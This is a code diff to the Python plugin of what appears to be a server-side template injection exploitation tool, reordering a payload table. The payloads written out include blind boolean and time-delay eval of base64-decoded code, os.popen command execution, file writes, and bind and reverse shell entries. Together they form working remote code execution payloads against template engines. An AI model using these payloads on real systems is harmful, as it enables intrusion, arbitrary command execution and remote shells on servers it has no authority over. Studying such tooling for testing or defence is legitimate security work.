@@ -31,6 +31,55 @@ class Python(Plugin):
                 'test_render': f"""str('{rand.randstrings[0]}'.join('{rand.randstrings[1]}'))""",
                 'test_render_expected': f'{rand.randstrings[0].join(rand.randstrings[1])}'
             },
+            'boolean': {
+                'call': 'evaluate_blind',
+                'test_bool_true':  "1 / ('a'.join('bc') == 'bac')",
+                'test_bool_false': "1 / ('a'.join('bc') == 'abc')",
+                'verify_bool_true':  "1 / (bool('False') == True)",
+                'verify_bool_false': "1 / (bool('True') == False)"
+            },
+            'blind': {
+                'call': 'evaluate_blind',
+                'test_bool_true': """'a'.join('ab') == 'aab'""",
+                'test_bool_false': 'True == False'
+            },
+            'evaluate': {
+                'call': 'render',
+                'evaluate': """str({code})""",
+                'test_os': """'-'.join([__import__('os').name, __import__('sys').platform])""",
+                'test_os_expected': r'^[\w-]+$'
+            },
+            'evaluate_boolean': {
+                'call': 'inject',
+                'evaluate_blind': """str(1 / bool(eval(__import__('base64').urlsafe_b64decode('{code_b64}').decode())))"""
+            },
+            'evaluate_blind': {
+                'call': 'evaluate',
+                'evaluate_blind': """eval(__import__('base64').urlsafe_b64decode('{code_b64}').decode()) and __import__('time').sleep({delay})"""
+            },
+            'execute': {
+                'call': 'evaluate',
+                'execute': """__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode()).read()""",
+                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
+                'test_cmd_expected': rand.randstrings[2]
+            },
+            'execute_boolean': {
+                'call': 'evaluate',
+                # TODO: payloads for python2 and python3 < 3.6
+                'execute_blind': """1 / (__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode())._proc.wait() == 0)"""
+            },
+            'execute_blind': {
+                'call': 'evaluate',
+                'execute_blind': """__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode() + ' && sleep {delay}').read()"""
+            },
+            'bind_shell': {
+                'call': 'execute_blind',
+                'bind_shell': bash.bind_shell
+            },
+            'reverse_shell': {
+                'call': 'execute_blind',
+                'reverse_shell': bash.reverse_shell
+            },
             'write': {
                 'call': 'evaluate',
                 'write': """open("{path}", 'ab+').write(__import__("base64").urlsafe_b64decode('{chunk_b64}'))""",
@@ -43,55 +92,6 @@ class Python(Plugin):
             'md5': {
                 'call': 'evaluate',
                 'md5': """__import__("hashlib").md5(open("{path}", 'rb').read()).hexdigest()"""
-            },
-            'evaluate': {
-                'call': 'render',
-                'evaluate': """str({code})""",
-                'test_os': """'-'.join([__import__('os').name, __import__('sys').platform])""",
-                'test_os_expected': r'^[\w-]+$'
-            },
-            'execute': {
-                'call': 'evaluate',
-                'execute': """__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode()).read()""",
-                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
-                'test_cmd_expected': rand.randstrings[2] 
-            },
-            'blind': {
-                'call': 'evaluate_blind',
-                'test_bool_true': """'a'.join('ab') == 'aab'""",
-                'test_bool_false': 'True == False'
-            },
-            'boolean': {
-                'call': 'inject',
-                'test_bool_true':  "1 / ('a'.join('bc') == 'bac')",
-                'test_bool_false': "1 / ('a'.join('bc') == 'abc')",
-                'verify_bool_true':  "1 / (bool('False') == True)",
-                'verify_bool_false': "1 / (bool('True') == False)"
-            },
-            'evaluate_blind': {
-                'call': 'evaluate',
-                'evaluate_blind': """eval(__import__('base64').urlsafe_b64decode('{code_b64}').decode()) and __import__('time').sleep({delay})"""
-            },
-            'evaluate_boolean': {
-                'call': 'evaluate',
-                'evaluate_blind': """1 / bool(eval(__import__('base64').urlsafe_b64decode('{code_b64}').decode()))"""
-            },
-            'bind_shell': {
-                'call': 'execute_blind',
-                'bind_shell': bash.bind_shell
-            },
-            'reverse_shell': {
-                'call': 'execute_blind',
-                'reverse_shell': bash.reverse_shell
-            },
-            'execute_blind': {
-                'call': 'evaluate',
-                'execute_blind': """__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode() + ' && sleep {delay}').read()"""
-            },
-            'execute_boolean': {
-                'call': 'evaluate',
-                # TODO: payloads for python2 and python3 < 3.6
-                'execute_blind': """1 / (__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode())._proc.wait() == 0)"""
             },
         })
 
